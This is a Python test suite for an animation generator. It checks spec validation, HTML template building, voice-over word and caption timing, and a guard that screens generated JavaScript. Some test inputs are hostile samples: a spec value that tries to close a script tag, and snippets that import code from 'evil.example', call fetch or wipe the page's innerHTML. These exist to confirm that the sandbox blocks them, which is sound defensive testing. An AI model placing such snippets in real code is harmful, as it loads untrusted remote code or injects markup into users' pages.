"""3D and motion animations: the quick specs, the voice timing and the code guard."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from rasika_worker import motion, whatif


def test_graph_spec_keeps_the_users_numbers() -> None:
    spec = motion.check_spec(
        "graph",
        {
            "label": "Followers",
            "values": [1.2, "2,100", 3],
            "labels": ["a", "b", "c"],
            "final": "100000",
        },
    )
    assert spec["values"] == [1.2, 2100.0, 3.0]
    assert spec["labels"] == ["a", "b", "c"]
    assert spec["final"] == 100000.0
    assert spec["dark"] is False


@pytest.mark.parametrize("values", [[5], [], [1, -2], [0, 0], ["x", 3]])
def test_graph_spec_refuses_too_few_or_bad_numbers(values: list[object]) -> None:
    with pytest.raises(motion.SpecError):
        motion.check_spec("graph", {"values": values})


def test_graph_labels_dropped_when_they_dont_match() -> None:
    assert motion.check_spec("graph", {"values": [1, 2, 3], "labels": ["a"]})["labels"] == []


def test_map_spec_fills_places_and_rejects_a_bad_colour() -> None:
    spec = motion.check_spec(
        "maproute",
        {
            "destination": "Iron Yard Gym",
            "minutes": 9,
            "distance": 2.8,
            "places": ["A"],
            "accent": "blue",
        },
    )
    assert spec["places"] == ["A", "", "", "", ""]
    assert spec["accent"] == "#2f7cf6"
    with pytest.raises(motion.SpecError):
        motion.check_spec("maproute", {"destination": "Gym"})


def test_breakdown_needs_six_labels() -> None:
    with pytest.raises(motion.SpecError):
        motion.check_spec("breakdown", {"labels": [["a", "b"]]})
    assert len(motion.check_spec("breakdown", {})["labels"]) == 6


def test_minimal_steps_are_clamped_and_length_follows_them() -> None:
    a = motion.check_spec("minimal", {"lines": ["one."], "steps": 12})
    assert a["steps"] == 7
    b = motion.check_spec("minimal", {"lines": ["one."], "steps": 3})
    assert motion.duration("minimal", a) > motion.duration("minimal", b)


def test_build_project_fills_the_template(tmp_path: Path) -> None:
    gsap = tmp_path / "gsap.min.js"
    gsap.write_text("/* gsap */", encoding="utf-8")
    spec = motion.check_spec("graph", {"values": [1, 2], "label": "</script>x"})
    dur = motion.build_project("graph", spec, tmp_path / "p", gsap, None)
    html = (tmp_path / "p" / "index.html").read_text(encoding="utf-8")
    assert "__SPEC__" not in html and "__DURATION__" not in html
    assert f"{dur:.3f}" in html
    assert "<\\/script>x" in html  # the spec can't close the script tag
    assert (tmp_path / "p" / "vendor" / "gsap.min.js").exists()
    with pytest.raises(RuntimeError):  # the 3D ones need three.js
        motion.build_project(
            "maproute",
            motion.check_spec("maproute", {"destination": "G", "minutes": 3, "distance": 1}),
            tmp_path / "q",
            gsap,
            None,
        )


WORDS = [
    {"w": w, "t": i * 0.4, "end": i * 0.4 + 0.35, "conf": 1.0}
    for i, w in enumerate(
        ["What", "if", "you", "jumped?", "Most", "people", "think", "so.", "But", "no."]
    )
]


def test_timing_matches_words_to_sentences() -> None:
    tm = whatif.timing(WORDS, ["What if you jumped?", "Most people think so.", "But no."])
    assert [w["line"] for w in tm["words"]] == [0, 0, 0, 0, 1, 1, 1, 1, 2, 2]
    assert [x["text"] for x in tm["lines"]] == [
        "What if you jumped?",
        "Most people think so.",
        "But no.",
    ]
    assert tm["lines"][1]["s"] == pytest.approx(1.6)
    assert tm["captions"][:2] == [[0.0, "What if you"], [1.2, "jumped?"]]  # 1-3 words a caption
    assert len(tm["captions"][-1]) == 3  # the last caption has an end
    assert tm["end"] == pytest.approx(9 * 0.4 + 0.35)


def test_timing_needs_words() -> None:
    with pytest.raises(whatif.AnimationError):
        whatif.timing([], ["a b c"])


def test_timing_files(tmp_path: Path) -> None:
    tm = whatif.timing(WORDS, ["What if you jumped?", "Most people think so.", "But no."])
    p3 = whatif.new_project(whatif.ENGINES["whatif3d"], tmp_path / "3d")
    whatif.write_timing(whatif.ENGINES["whatif3d"], p3, tm, 4.5)
    js = (p3 / "src" / "timing.js").read_text(encoding="utf-8")
    assert "export const DURATION = 4.50;" in js
    assert json.dumps(tm["captions"]) in js
    assert not (p3 / "example_shots.js").exists()
    assert (p3 / "fonts" / "montserrat-latin-700-normal.woff2").exists()
    ps = whatif.new_project(whatif.ENGINES["stick"], tmp_path / "stick")
    whatif.write_timing(whatif.ENGINES["stick"], ps, tm, 4.5)
    assert "const VO_END = 4.50;" in (ps / "words.js").read_text(encoding="utf-8")


def test_the_code_guard() -> None:
    e3, es = whatif.ENGINES["whatif3d"], whatif.ENGINES["stick"]
    ok = "import * as THREE from 'three';\nimport { kf } from './anim.js';\nconst c = document.createElement('canvas');\nexport const SHOTS = [];"
    assert whatif.unsafe(e3, ok) == []
    assert whatif.unsafe(e3, "import x from 'https://evil.example/x.js';")
    assert whatif.unsafe(e3, "fetch('/x')")
    assert whatif.unsafe(e3, "const r = Math.random();")
    assert whatif.unsafe(e3, "document.body.innerHTML = ''")
    assert whatif.unsafe(e3, "export const DURATION = 3;")
    assert whatif.unsafe(
        es, "import * as THREE from 'three';"
    )  # the stick engine is a classic script
    assert (
        whatif.unsafe(
            es, "const SHOTS = []; SHOTS.push({start: 0, end: 1, tr: 'cut', draw(ctx, lt, t) {}});"
        )
        == []
    )


def test_install_shots_holds_the_last_shot(tmp_path: Path) -> None:
    p = whatif.new_project(whatif.ENGINES["stick"], tmp_path / "s")
    whatif.install_shots(whatif.ENGINES["stick"], p, "const SHOTS = [];\n", 12.34)
    assert "12.34" in (p / "shots.js").read_text(encoding="utf-8")


def test_cues_on_every_cut_but_the_first() -> None:
    cues = whatif.cues({}, [[0, 2], [2, 5], [5, 9]], "cinematic")
    assert [c["t"] for c in cues] == [1.92, 4.92]
